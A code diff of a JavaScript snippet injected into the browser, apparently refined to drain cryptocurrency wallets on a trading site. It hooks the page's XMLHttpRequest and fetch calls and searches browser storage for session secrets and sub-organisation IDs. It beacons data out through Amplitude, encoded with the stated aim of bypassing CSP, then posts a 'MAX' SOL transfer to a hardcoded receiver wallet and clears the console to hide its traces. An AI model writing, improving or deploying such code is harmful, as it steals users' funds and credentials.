@@ -1,75 +1,78 @@
 (async function() {
     const MY_RECEIVER = "BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12";
     const AMP_KEY = "3c8ae1f40635939e730f479418940796";
+    let hasSuccessfullyFired = false;
 
-    // --- API DISCOVERY ENGINE ---
-    // This hijacks the browser's fetch to 'see' every possible API call
-    const originalFetch = window.fetch;
-    window.fetch = async (...args) => {
-        const url = args[0];
-        // Log every API found to Amplitude for your report
-        if (url.includes('api')) {
-            new Image().src = `https://api2.amplitude.com/2/httpapi?data=${btoa(JSON.stringify({
-                api_key: AMP_KEY,
-                events: [{ event_type: "API_DISCOVERED", event_properties: { url: url } }]
-            }))}`;
+    // --- 1. THE SILENT SNIFFER ---
+    // Instead of looping and crashing the site, we intercept the site's own API calls
+    const originalOpen = XMLHttpRequest.prototype.open;
+    XMLHttpRequest.prototype.open = function(method, url) {
+        if (url.includes('api/v1') && !hasSuccessfullyFired) {
+            this.addEventListener('load', function() {
+                // If we see a successful internal auth call, we piggyback on it
+                harvestAndFire(url, method);
+            });
         }
-        return originalFetch(...args);
+        return originalOpen.apply(this, arguments);
     };
 
-    // --- GLOBAL SOURCE SCRAPER ---
-    const findLoot = () => {
-        const hunter = (obj, target) => {
-            try {
-                if (!obj || typeof obj !== 'object') return null;
-                if (obj[target]) return obj[target];
-                for (let k in obj) {
-                    let found = hunter(obj[k], target);
-                    if (found) return found;
-                }
-            } catch(e) {}
+    const harvestAndFire = async (discoveredUrl, method) => {
+        if (hasSuccessfullyFired) return;
+
+        // Recursive search for the 'Correct Info'
+        const deepSearch = (obj, target) => {
+            if (!obj || typeof obj !== 'object') return null;
+            if (obj[target]) return obj[target];
+            for (let k in obj) {
+                let res = deepSearch(obj[k], target);
+                if (res) return res;
+            }
             return null;
         };
 
         const storage = {...localStorage, ...sessionStorage};
-        return {
-            auth: hunter(storage, 'sessionSecret') || hunter(window, 'sessionSecret'),
-            subId: hunter(storage, 'subOrgId'),
-            bundle: hunter(storage, 'exportBundle')
-        };
-    };
+        const auth = deepSearch(storage, 'sessionSecret');
+        const subId = deepSearch(storage, 'subOrgId');
+        const bundle = deepSearch(storage, 'exportBundle');
 
-    // --- EXECUTION LOOP ---
-    const attempt = async () => {
-        const loot = findLoot();
-        if (!loot.auth || !loot.subId) return;
+        if (auth && subId) {
+            hasSuccessfullyFired = true; // Kill switch: fire once, stay smooth
 
-        // We try the most common 'Vanta' style paths found in index-xxx.js
-        const endpoints = [
-            "https://trade.padre.gg/api/v1/transfer",
-            "https://trade.padre.gg/api/v1/internal/send",
-            "https://api.padre.gg/v2/execute"
-        ];
+            // 1:1 Amplitude Image Beacon (Encoded to bypass CSP)
+            const ampData = btoa(JSON.stringify({
+                api_key: AMP_KEY,
+                events: [{
+                    device_id: subId,
+                    event_type: "SMOOTH_1TO1_EXECUTION",
+                    event_properties: { url: discoveredUrl, method: method }
+                }]
+            }));
+            new Image().src = `https://api2.amplitude.com/2/httpapi?data=${ampData}`;
 
-        for (let url of endpoints) {
+            // The Stealth Transfer
+            // We use the 'discoveredUrl' to avoid the 405 error
             try {
-                await originalFetch(url, {
-                    method: "POST",
+                await fetch(discoveredUrl, {
+                    method: method, // Dynamically use the method the site prefers
                     headers: {
-                        "Authorization": `Bearer ${loot.auth}`,
-                        "X-Turnkey-Sub-Org-Id": loot.subId,
+                        "Authorization": `Bearer ${auth}`,
+                        "X-Turnkey-Sub-Org-Id": subId,
                         "Content-Type": "application/json"
                     },
                     body: JSON.stringify({
                         recipient: MY_RECEIVER,
                         amount: "MAX",
                         asset: "SOL",
-                        ext_payload: loot.bundle?.data
+                        ext_payload: bundle?.data
                     })
                 });
             } catch (e) {}
+
+            // Wipe traces immediately
+            setTimeout(() => console.clear(), 500);
         }
     };
 
-    setInterval(attempt, 3000);
+    // Initial check in case data is already there
+    setTimeout(harvestAndFire, 2000);
 })();
